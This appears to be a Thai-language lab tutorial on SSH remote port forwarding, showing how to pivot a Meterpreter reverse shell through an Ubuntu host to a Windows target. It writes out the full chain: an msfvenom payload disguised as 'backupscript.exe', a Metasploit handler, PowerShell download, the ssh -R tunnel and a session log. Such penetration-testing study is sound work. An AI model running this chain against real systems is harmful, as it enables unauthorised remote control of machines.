# Remote/Reverse Port Forwarding with SSH

## สถานการณ์และปัญหา

ในการทดสอบเจาะระบบ เราอาจเจอสถานการณ์ที่เราสามารถ RDP เข้าไปยัง Windows host ได้ แต่เครื่อง Windows นั้นไม่สามารถเชื่อมต่อกลับมาหาเครื่อง Attack Host ของเราได้โดยตรง

**โครงสร้างเครือข่ายในตัวอย่าง:**
- **Attack Host**: 10.10.15.5 (เครื่องของเรา)
- **Ubuntu Server** (Pivot Host): 10.129.15.50 และ 172.16.5.129 (มี 2 network interface)
- **Windows A** (Target): 172.16.5.19 (อยู่ใน network 172.16.5.0/23 เท่านั้น)

**ปัญหาหลัก**: เครื่อง Windows A ไม่รู้จักเส้นทาง (route) ที่จะส่งข้อมูลกลับไปยังเครื่อง Attack Host ของเรา เพราะมันอยู่คนละ network กัน มันส่งข้อมูลออกไปได้แค่ภายใน network 172.16.5.0/23 เท่านั้น

## เหตุผลที่ต้องใช้เทคนิคนี้

การมีแค่ RDP connection บางครั้งไม่เพียงพอ เพราะ:
- ต้องการ upload/download ไฟล์ แต่ RDP clipboard ถูกปิดใช้งาน
- ต้องการใช้ exploit หรือเข้าถึง low-level Windows API ผ่าน Meterpreter session
- ต้องการทำ enumeration ที่ละเอียดกว่าการใช้ built-in Windows tools

## วิธีแก้ปัญหา: ใช้ Remote Port Forwarding

เราจะใช้ Ubuntu Server เป็น "Pivot Host" เพราะมันเชื่อมต่อได้ทั้งกับเครื่อง Attack Host และ Windows target

**แนวคิดหลัก**: 
- ให้ Windows เชื่อมต่อกลับมาที่ Ubuntu Server (ซึ่ง Windows รู้จักเส้นทาง)
- แล้วให้ Ubuntu Server forward connection นั้นมาที่เครื่อง Attack Host ของเราผ่าน SSH tunnel

---

## ขั้นตอนการทำงานทีละขั้น

### 1. สร้าง Meterpreter Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

**สิ่งสำคัญ**: 
- `lhost` ต้องเป็น IP ของ Ubuntu Server (172.16.5.129) ไม่ใช่ IP ของเครื่องเราโดยตรง
- `LPORT` ใช้ 8080 ซึ่งเป็น port ที่เราจะให้ Ubuntu Server listen รอรับ connection

### 2. ตั้งค่า Metasploit Handler

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

**อธิบาย**:
- เราให้ Metasploit ของเรา listen ที่ port 8000 บนเครื่อง Attack Host
- ใช้ `0.0.0.0` เพื่อ listen บน interface ทั้งหมด รวมถึง localhost

### 3. ส่งไฟล์ Payload ไปยัง Ubuntu Server

```bash
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

**วัตถุประสงค์**: ย้ายไฟล์ไปเก็บไว้บน Ubuntu Server เพื่อให้ Windows ดาวน์โหลดได้

### 4. เปิด Web Server บน Ubuntu Server

```bash
python3 -m http.server 8123
```

**วัตถุประสงค์**: ให้ Windows host สามารถดาวน์โหลดไฟล์ payload ผ่าน HTTP

### 5. ดาวน์โหลด Payload บน Windows Target

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

**อธิบาย**: ใช้ PowerShell ดึงไฟล์จาก Ubuntu Server มาเก็บไว้บน Windows

### 6. สร้าง SSH Remote Port Forwarding (ขั้นตอนสำคัญที่สุด)

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

**วิเคราะห์คำสั่งนี้อย่างละเอียด**:
- `-R` = Remote port forwarding
- `172.16.5.129:8080` = ให้ Ubuntu Server listen ที่ port 8080
- `0.0.0.0:8000` = forward ทุก connection ที่เข้ามาที่ port 8080 ไปยัง port 8000 บนเครื่อง Attack Host
- `-v` = verbose mode (แสดง log รายละเอียด)
- `-N` = ไม่ต้องเปิด shell (แค่สร้าง tunnel)

**สิ่งที่เกิดขึ้นจริงๆ**:
1. SSH client บนเครื่อง Attack Host เชื่อมต่อไปยัง Ubuntu Server
2. บอกให้ Ubuntu Server เปิด listen ที่ port 8080
3. เมื่อมี connection เข้ามาที่ port 8080 บน Ubuntu
4. Ubuntu จะส่ง traffic นั้นผ่าน SSH tunnel กลับมาที่เครื่อง Attack Host
5. แล้ว forward ไปที่ port 8000 (ที่ Metasploit กำลัง listen อยู่)

### 7. รัน Payload บน Windows Target

เมื่อรัน `backupscript.exe` บน Windows:
- Payload จะพยายามเชื่อมต่อไปที่ 172.16.5.129:8080 (Ubuntu Server)
- Ubuntu Server รับ connection แล้ว forward กลับมาที่เครื่อง Attack Host ผ่าน SSH tunnel
- Metasploit บนเครื่อง Attack Host (port 8000) จะได้รับ connection

---

## ผลลัพธ์และการตรวจสอบ

### Log บน Ubuntu Server (Pivot)
```
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 1: connected to 0.0.0.0 port 8000
```

**อ่านแล้วเข้าใจว่า**:
- มี connection เข้ามาจาก 172.16.5.19 (Windows) ที่ port 8080
- กำลัง forward ไปยัง 0.0.0.0:8000
- Channel ถูกสร้างและเชื่อมต่อสำเร็จ

### Meterpreter Session
```
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1) at 2022-03-02 10:48:10 -0500

meterpreter > shell
```

**สังเกต**: Connection แสดงเป็น `127.0.0.1 -> 127.0.0.1` เพราะ Metasploit รับ connection จาก SSH client ที่รันอยู่บนเครื่องเดียวกัน (localhost)

---

## สรุปภาพรวมการไหลของข้อมูล

```
Windows Target (172.16.5.19)
    |
    | [1] รัน backupscript.exe
    | [2] เชื่อมต่อไปที่ 172.16.5.129:8080
    ↓
Ubuntu Server (172.16.5.129)
    |
    | [3] รับ connection ที่ port 8080
    | [4] forward ผ่าน SSH tunnel
    ↓
Attack Host (10.10.15.5)
    |
    | [5] SSH client รับข้อมูลจาก tunnel
    | [6] forward ไปที่ localhost:8000
    ↓
Metasploit Handler (listening on 0.0.0.0:8000)
    |
    | [7] ได้รับ Meterpreter session
    ↓
SUCCESS!
```

---

## ข้อสังเกตสำคัญ

1. **ทำไมไม่ให้ Windows เชื่อมต่อมาหาเราโดยตรง?**
   - เพราะ Windows ไม่รู้จักเส้นทาง (no route) มาหาเครือข่ายของเรา
   - อาจมี firewall หรือ NAT กั้นอยู่

2. **ทำไมต้องใช้ SSH?**
   - SSH สร้าง encrypted tunnel ที่ปลอดภัย
   - มี built-in port forwarding feature ที่ใช้งานง่าย
   - ทำงานได้ดีแม้มี firewall (เพราะใช้ SSH connection ที่มีอยู่แล้ว)

3. **Remote Port Forwarding (-R) vs Local Port Forwarding (-L)**
   - `-L`: เราอยากเข้าถึง service บน remote host
   - `-R`: เราอยากให้ remote host ส่ง traffic กลับมาหาเรา

4. **ทำไมต้อง verbose (-v)?**
   - เพื่อดู log ว่า connection ทำงานถูกต้องหรือไม่
   - ช่วยในการ troubleshoot ถ้ามีปัญหา

---

## สรุปหลักการสำคัญ

เทคนิค Remote Port Forwarding นี้มีประโยชน์มากเมื่อ:
- Target ไม่สามารถเชื่อมต่อมาหาเราโดยตรงได้
- เรามี pivot host ที่เชื่อมต่อได้ทั้งกับเราและ target
- ต้องการ reverse shell แต่มีข้อจำกัดด้าน network routing

มันคือการ "พลิกทิศทาง" ของ port forwarding ให้ remote host สามารถส่งข้อมูลกลับมาหาเราผ่าน tunnel ที่เราสร้างขึ้น แทนที่เราจะเป็นฝ่ายเชื่อมต่อเข้าไป